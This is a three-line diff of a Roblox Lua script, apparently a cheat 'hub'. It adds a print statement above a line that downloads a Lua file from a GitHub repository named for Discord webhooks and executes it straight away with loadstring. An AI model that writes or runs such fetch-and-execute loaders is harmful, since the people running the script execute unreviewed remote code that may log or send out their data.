@@ -1,3 +1,4 @@
+print("Run NoName Hub")
 loadstring(game:HttpGet(("https://raw.githubusercontent.com/GODMODs132/WebHook-Discord-Roblox/main/Script.lua"),true))()
 
 local function authorizeKey(key)
